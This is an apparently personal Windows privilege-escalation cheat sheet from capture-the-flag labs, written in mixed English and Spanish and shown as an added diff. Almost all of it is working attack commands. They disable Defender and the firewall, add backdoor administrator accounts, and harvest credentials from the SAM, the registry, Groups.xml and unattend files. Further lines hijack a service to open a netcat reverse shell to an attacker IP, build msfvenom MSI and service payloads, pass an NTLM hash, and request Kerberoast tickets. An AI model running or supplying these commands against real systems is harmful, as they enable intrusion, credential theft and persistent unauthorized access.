@@ -1,0 +1,258 @@
+https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe   
+chimichrri.exe 10.10.14.27 6666      nc -nlvp 6666
+
+
+
+# Creating User and Adding to Local Administrators
+net user spotless spotless /add & net localgroup Administrators spotless /add
+
+Windows
+
+# Disable firewall/defender and enable RDP for all
+sc stop WinDefend
+netsh advfirewall show allprofiles
+netsh advfirewall set allprofiles state off
+netsh firewall set opmode disable
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
+
+
+Enumeration
+
+whoami
+whoami /priv
+----------------------
+
+Is anyone else logged in?
+qwinsta
+----------------------------
+
+Is XAMPP, Apache, or PHP installed? Any there any XAMPP, Apache, or PHP configuration files?
+dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf
+------------------------------------------
+
+Any interesting files to look at? Possibly inside User directories (Desktop, Documents, etc)?
+dir /s *pass* == *vnc* == *.config* 2>nul
+-------------------------------------------
+
+Files containing password inside them?
+findstr /si password *.xml *.ini *.txt *.config 2>nul
+findstr /si pass *.txt | *.xml | *.ini
+dir /s *cred* == *pass* == *.conf
+------------------------------------------
+
+
+Anything interesting in Credential Manager?
+cmdkey /list
+dir C:\Users\username\AppData\Local\Microsoft\Credentials\
+dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
+Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+---------------------------
+
+Can we access SAM and SYSTEM files?
+%SYSTEMROOT%\repair\SAM
+%SYSTEMROOT%\System32\config\RegBack\SAM
+%SYSTEMROOT%\System32\config\SAM
+%SYSTEMROOT%\repair\system
+%SYSTEMROOT%\System32\config\SYSTEM
+%SYSTEMROOT%\System32\config\RegBack\system
+-----------------------
+Stored Credentials: Windows
+c:\unattend.xml
+c:\sysprep.inf
+c:\sysprep\sysprep.xml
+dir c:\*vnc.ini /s /b
+dir c:\*ultravnc.ini /s /b 
+dir c:\ /s /b | findstr /si *vnc.ini
+--------------------------------
+
+
+
+What’s in the IIS Logs?
+C:\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log
+C:\inetpub\logs\LogFiles\W3SVC2\u_ex[YYMMDD].log
+C:\inetpub\logs\LogFiles\FTPSVC1\u_ex[YYMMDD].log
+C:\inetpub\logs\LogFiles\FTPSVC2\u_ex[YYMMDD].log
+------------------------------------
+
+#port forwarding
+plink.exe -l root -pw -R 445:127.0.0.1:445 10.10.14.21
+
+# basics
+systeminfo
+hostname
+echo %username%
+
+# users
+net users
+net user <username>
+
+# network
+ipconfig /all
+route print
+arp -A
+netstat -ano  # active network connections
+
+# firewall status
+netsh firewall show state
+netsh firewall show config
+netsh advfirewall firewall show rule all
+
+#Windows-exploit-suggester: systeminfo output save in a file, check for vulnerabilities
+https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py
+sudo python windows-exploit-suggester.py --update
+sudo pip install xlrd --upgrade
+Crear el systeminfo.txt y volcar los datos del systeminfo de la máquina victima windows.
+python windows-exploit-suggester.py --database 2020-03-16-mssb.xls --systeminfo systeminfo.txt
+
+
+
+# Search patches for given patch
+wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
+
+--------------------------------------
+Kernel
+systeminfo
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+
+# check for possible exploits, find a place to upload (eg: C:\Inetpub or C:\temp) it, run exe
+
+--------------------------------------
+Weak permissions
+# this example is for XP SP0
+# upload accesschk.exe to a writable directory first 
+# for XP version 5.2 of accesschk.exe is needed
+https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe 
+
+# check for serices with weak permissions
+accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+# check for the found services above
+accesschk.exe -ucqv upnphost
+# upload nc.exe to writable directory
+sc config upnphost binpath= "C:\Inetpub\nc.exe -nv <attackerip> 9988 -e C:\WINDOWS\System32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+# check the status now
+sc qc upnphost
+# change start option as AUTO-START 
+sc config SSDPSRV start= auto
+#start the services
+net start SSDPSRV
+net stop upnphost
+net start upnphost
+
+# listen on port 9988 and you'll get a shell with NT AUTHORITY\SYSTEM privileges
+
+--------------------------------------
+# VNC
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+
+
+----------------------------------------------------
+# AÑADIR USUARIO
+churrasco -d "net user /add "
+churrasco -d "net localgroup administrators /add"
+churrasco -d "NET LOCALGROUP "Remote Desktop Users" /ADD"
+
+
+----------------------------------------
+
+Registry Checks for Passwords
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
+
+--------------------------------------
+Places to Check for Credentials. Es probable que nos las encontremos en Base64
+
+C:\sysprep.inf
+C:\sysprep\sysprep.xml
+%WINDIR%\Panther\Unattend\Unattended.xml
+%WINDIR%\Panther\Unattended.xml
+
+dir /b /s unattend.xml
+dir /b /s web.config
+dir /b /s sysprep.inf
+dir /b /s sysprep.xml
+dir /b /s *pass*
+dir /b /s vnc.ini
+
+----------------------------
+Groups.xml
+# Look up ip-addres of DC
+nslookup nameofserver.whatever.local
+
+# It will output something like this
+Address:  192.168.1.101
+
+# Now we mount it
+net use z: \\192.168.1.101\SYSVOL
+
+# And enter it
+z:
+
+# Now we search for the groups.xml file
+dir Groups.xml /s
+
+# decrypt the password in it
+gpp-decrypt <pass>
+
+-----------------------------
+
+AlwaysInstallElevated
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+# From the output, notice that “AlwaysInstallElevated” value is 1.
+
+# Exploitation:
+msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o setup.msi
+Place 'setup.msi' in 'C:\Temp'
+msiexec /quiet /qn /i C:\Temp\setup.msi
+net localgroup Administrators
+
+---------------------------------
+Find writable files
+
+
+dir /a-r-d /s /b
+/a is to search for attributes. In this case r is read only and d is directory. (look for writable files only)
+/s means recurse subdirectories
+/b means bare format. Path and filename only.
+
+-----------------------------------
+Unquoted Path
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ 
+# Suppose we found: C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
+# check for permissions of folder path
+icacls "C:\Program Files (x86)\Program Folder" 
+
+# exploit
+msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
+Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
+#Open command prompt and type: 
+sc start unquotedsrvc
+net localgroup Administrators
+
+-----------------------------------
+# psexec using found credentials
+# first upload nc.exe to a writable directory
+psexec.exe -u <username> -p <password> \\MACHINENAME C:\Inetpub\nc.exe <attackerip> <attackerport> -e C:\windows\system32\cmd.exe
+
+# PARA ENTRAR EN EL WINDOWS CON EL HASH NTLM DE WINDOWS:
+pth-winexe -U ./Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe
+                                                       hash                                       ip vícitima   
+
+# GetUserSPNs.py (impacket)
+./GetUserSPNs.py -request ACTIVE.HTB/SVC_TGS:password -dc -ip 10.10.10.100                                     usuario:pass              ip víctima
+Este gesto me dará el hash del usuario admin.													   
+
+# Any other interesting interface configurations?
+netsh dump
+
+#Para ver el archivo sin tener permisos:
+cacls root.txt /E /P everyone:f
+root.txt
+type root.txt
